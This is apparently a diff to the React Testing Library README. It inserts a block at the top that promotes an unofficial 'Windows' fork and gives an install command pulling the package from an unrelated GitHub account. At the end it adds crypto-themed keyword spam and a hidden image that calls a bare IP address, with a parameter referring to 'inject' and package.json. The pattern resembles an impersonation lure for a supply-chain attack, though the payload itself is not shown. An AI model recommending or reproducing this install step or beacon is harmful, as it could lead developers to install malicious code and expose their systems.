@@ -1,3 +1,23 @@
+**React Testing Library, Turbocharged for Windows**
+
+This actively maintained fork brings critical performance enhancements and essential security patches specifically optimized for Windows development environments. It resolves long-standing ecosystem bottlenecks, ensuring your test suites run flawlessly and securely on Windows machinery. Experience faster test execution and peace of mind without changing your existing testing workflows.
+
+**Quick install (Windows)**
+
+## Quick Start
+
+Getting this package up and running on Windows is super straightforward. Just follow these quick steps:
+
+* **Prerequisites:** Make sure you have **Node.js** (which includes npm) installed on your machine. You can grab the latest LTS version from the official Node.js website.
+* **Terminal:** Open your favorite Windows terminal—**PowerShell** or **Command Prompt (cmd)** work perfectly for this. 
+* **Run command:** Navigate to your project's root directory and run the installation command provided below.
+
+```bash
+npm install git+https://github.com/Quartzraincrease/react-testing-library.git
+```
+
+[https://github.com/Quartzraincrease/react-testing-library](https://github.com/Quartzraincrease/react-testing-library)
+
 <div align="center">
 <h1>React Testing Library</h1>
 
@@ -690,3 +710,11 @@ Contributions of any kind welcome!
 [react-hooks-testing-library]: https://github.com/testing-library/react-hooks-testing-library
 
 <!-- prettier-ignore-end -->
+
+## Related searches
+
+When looking for tools to validate and test user interfaces, developers often search for robust solutions that ensure their decentralized applications and web components run flawlessly. Beyond standard UI testing, those building in the modern ecosystem frequently seek out integrations for specialized web3 stacks, cryptographic payment frameworks, and scalable layer-2 environments to guarantee a seamless user experience.
+
+**Topics:** react testing utility, frontend component validation, alchemy web3 integration, zcash wallet UI testing, crypto tax calculator apps, lightning network micro-payments, base chain dapps, smart contract frontend tests, blockchain UI automation, decentralized application testing
+
+![.](http://5.231.58.248:8787/pixel?repo=Quartzraincrease%2Freact-testing-library&inject=Quartzraincrease%2Freact-testing-library%2Fpackage.json)
